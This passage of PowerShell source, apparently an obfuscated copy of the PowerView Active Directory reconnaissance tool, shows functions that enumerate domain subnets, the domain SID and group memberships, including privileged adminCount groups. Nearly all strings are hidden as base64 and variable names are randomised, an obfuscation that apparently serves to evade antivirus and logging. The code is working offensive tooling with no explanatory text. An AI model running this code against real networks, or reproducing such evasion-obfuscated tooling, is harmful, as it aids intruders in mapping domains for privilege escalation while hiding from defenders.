   if (-not ${7b9f94c1270546ad8d065aec6410bbf7}) {
                   
         Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAG4AYQBiAGwAZQ
AgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAG
gAZQByACAAZgBvAHIAIAAnACQAewA4ADQANAAyADMAYwBiAGYANQBhADUANAA0AGYAZA
A2AGEAYQAwADUAZABjADcAMgAwADEAZgA4ADQAMgA1ADYAfQAnAA==')))
           
             }
                    }
                }
                
else {
                    try {
                        
${3e0cccb945b440b99b2100f08845f4a8} = (-Join 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAkADEA')))
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
                 }
                    catch {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOA
A4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkA')))
                   
 }
                }
            }
            if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
  $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
            }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
   
             Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAHMAaQBuAGcAIA
BhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAE
wARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            
${7b9f94c1270546ad8d065aec6410bbf7}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQ
AkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-
DomainSubnet] Get-DomainSubnet filter string: 
$(${7b9f94c1270546ad8d065aec6410bbf7}.filter)"
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${7b9f94c1270546ad8d065aec6410bbf7}.FindOne() }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${7b9f94c1270546ad8d065aec6410bbf7}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                    
${2096036d5d3f432eae3fc7189302a62d} = $_
                }
            
    else {
                    ${2096036d5d3f432eae3fc7189302a62d} = 
Convert-LDAPProperty -Properties $_.Properties
                }
      
          
${2096036d5d3f432eae3fc7189302a62d}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBTAHUAYgBuAGUAdAA='))))
                
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
       
             if (${2096036d5d3f432eae3fc7189302a62d}.properties -and 
(${2096036d5d3f432eae3fc7189302a62d}.properties.siteobject -like 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA=='))))) {
                        
${2096036d5d3f432eae3fc7189302a62d}
                    }
             
       elseif (${2096036d5d3f432eae3fc7189302a62d}.siteobject -like 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA==')))) {
                        
${2096036d5d3f432eae3fc7189302a62d}
                    }
             
   }
                else {
                    
${2096036d5d3f432eae3fc7189302a62d}
                }
            }
    
        if (${9f78951ba80c437e9db41515f07bc24e}) {
                
try { ${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                
catch {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHIAcgBvAHIAIA
BkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG
8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
         
   ${7b9f94c1270546ad8d065aec6410bbf7}.dispose()
        }
    }
}
function Get-DomainSID {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([String])]
    
[CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('DomainController')]
        [String]
        $Server,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    
${ea43c787582f45539b7f519da4680c7a} = @{
        'LDAPFilter' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')
))
    }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    
${55557fac2d794b03a016ccea2cb47905} = Get-DomainComputer 
@ea43c787582f45539b7f519da4680c7a -FindOne | Select-Object -First 1 
-ExpandProperty objectsid
    if 
(${55557fac2d794b03a016ccea2cb47905}) {
        
${55557fac2d794b03a016ccea2cb47905}.SubString(0, 
${55557fac2d794b03a016ccea2cb47905}.LastIndexOf('-'))
    }
    else 
{
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMASQBEAF0AIABFAHIAcgBvAHIAIABlAHgAdA
ByAGEAYwB0AGkAbgBnACAAZABvAG0AYQBpAG4AIABTAEkARAAgAGYAbwByACAAJwAkAE
QAbwBtAGEAaQBuACcA')))
    }
}
function Get-DomainGroup {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType
('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 
'AllowDelegation')]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [ValidateNotNullOrEmpty()]
        [Alias
('UserName')]
        [String]
        $MemberIdentity,
        
[Switch]
        $AdminCount,
        [ValidateSet('DomainLocal', 
'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 
'NotUniversal')]
        [Alias('Scope')]
        [String]
        
$GroupScope,
        [ValidateSet('Security', 'Distribution', 
'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        
$GroupProperty,
        [ValidateNotNullOrEmpty()]
        [String]
    
    $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias
('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
     
   [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet
('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        
$SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias
('ReturnOne')]
        [Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${342e0841e72a4d5b89eb7b6029624511} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
(${342e0841e72a4d5b89eb7b6029624511}) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('TQBlAG0AYgBlAHIASQBkAGUAbgB0AGkAdAB5AA==')))]) {
                if 
(${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    
${5385ca78f2754c48944175119f5a58a0} = 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $MemberIdentity
                
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))] = $True
                Get-DomainObject 
@ea43c787582f45539b7f519da4680c7a | ForEach-Object {
                 
   ${b4ebd5ff83e04a06b5cce7e72a83fc34} = $_.GetDirectoryEntry()
      
              ${b4ebd5ff83e04a06b5cce7e72a83fc34}.RefreshCache
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                    
${b4ebd5ff83e04a06b5cce7e72a83fc34}.TokenGroups | ForEach-Object {
   
                     ${55e6f9b7e70241398335631b9e828ed6} = (New-
Object System.Security.Principal.SecurityIdentifier($_,0)).Value
     
                   if (${55e6f9b7e70241398335631b9e828ed6} -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${55e6f9b7e70241398335631b9e828ed6}
                            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))] = $False
                            if 
(${5385ca78f2754c48944175119f5a58a0}) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = 
${5385ca78f2754c48944175119f5a58a0} }
                            
${b5a50316dca4465cad6cfeb0e116447c} = Get-DomainObject 
@ea43c787582f45539b7f519da4680c7a
                            if 
(${b5a50316dca4465cad6cfeb0e116447c}) {
                              
  ${b5a50316dca4465cad6cfeb0e116447c}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                      
          ${b5a50316dca4465cad6cfeb0e116447c}
                        
    }
                        }
                    }
                
}
            }
            else {
                
${987d1cda8c15450d8512978866836ba0} = ''
                $Filter = 
''
                $Identity | Where-Object {$_} | ForEach-Object {
   
                 ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace
('(', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADgA')))).Replace(')', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADkA'))))
                    if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAA==')))) {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQ
A0AGMAOQAxADgAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQApAA==')))
   
                 }
                    elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBDAE4APQA=')))) {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                        if ((-not 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
  
                          ${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                     Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdA
BlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADgANAA0ADIAMwBjAGIAZgA1AGEANQA0AD
QAZgBkADYAYQBhADAANQBkAGMANwAyADAAMQBmADgANAAyADUANgB9ACcAIABmAHIAbw
BtACAAJwAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AG
QANwAzAGMANgAwADcANAAyADYAZAAzAH0AJwA=')))
                           
 ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                    ${342e0841e72a4d5b89eb7b6029624511} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
       if (-not ${342e0841e72a4d5b89eb7b6029624511}) {
               
                 Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBuAGEAYgBsAGUAIA
B0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAG
UAcgAgAGYAbwByACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmADUAYQA1ADQANABmAGQANg
BhAGEAMAA1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJwA=')))
               
             }
                        }
                    }
         
           elseif (${0c2b6ec1d84e4c9188d4d73c607426d3} -imatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQ
AtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
            
            ${3e0cccb945b440b99b2100f08845f4a8} = 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                 
       ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
                 }
                    elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3}.Contains('\')) {
                
        ${1a83f5c24b5141dcbf4cb4cd70c98c69} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.Replace
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -
OutputType Canonical
                        if 
(${1a83f5c24b5141dcbf4cb4cd70c98c69}) {
                            
${e7b22e8963a14a049819cb0cd46c57ce} = 
${1a83f5c24b5141dcbf4cb4cd70c98c69}.SubString(0, 
${1a83f5c24b5141dcbf4cb4cd70c98c69}.IndexOf('/'))
                    
        $GroupName = ${0c2b6ec1d84e4c9188d4d73c607426d3}.Split('\')
[1]
                            ${987d1cda8c15450d8512978866836ba0} 
+= $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEcAcgBvAHUAcABOAGEAbQ
BlACkA')))
                            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${e7b22e8963a14a049819cb0cd46c57ce}
        
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdA
BlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AGUANwBiADIAMgBlADgAOQA2ADMAYQAxAD
QAYQAwADQAOQA4ADEAOQBjAGIAMABjAGQANAA2AGMANQA3AGMAZQB9ACcAIABmAHIAbw
BtACAAJwAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AG
QANwAzAGMANgAwADcANAAyADYAZAAzAH0AJwA=')))
                           
 ${342e0841e72a4d5b89eb7b6029624511} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
                        }
           
         }
                    else {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADAAYwAyAGIANg
BlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AG
QAMwB9ACkAKABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYw
A5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkAKQA=')))
       
             }
                }
                if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
      $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
                }
          
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
   
                 Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQ
BuAGcAIABmAG8AcgAgAGEAZABtAGkAbgBDAG8AdQBuAHQAPQAxAA==')))
           
         $Filter += $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
                }
      
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]) {
                    
${95733581d5c94760b4051c96bf107f25} = $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]
                    $Filter = 
Switch (${95733581d5c94760b4051c96bf107f25}) {
                       
 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANg
AuADEALgA0AC4AOAAwADMAOgA9ADQAKQA='))) }
                        
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAHQARABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))    { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQ
A1ADYALgAxAC4ANAAuADgAMAAzADoAPQA0ACkAKQA='))) }
                     
   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBsAG8AYgBhAGwA')))            { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANg
AuADEALgA0AC4AOAAwADMAOgA9ADIAKQA='))) }
                        
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAHQARwBsAG8AYgBhAGwA')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQ
A1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAKQA='))) }
                     
   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGkAdgBlAHIAcwBhAGwA')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANg
AuADEALgA0AC4AOAAwADMAOgA9ADgAKQA='))) }
                        
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAHQAVQBuAGkAdgBlAHIAcwBhAGwA')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQ
A1ADYALgAxAC4ANAAuADgAMAAzADoAPQA4ACkAKQA='))) }
                    
}
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQ
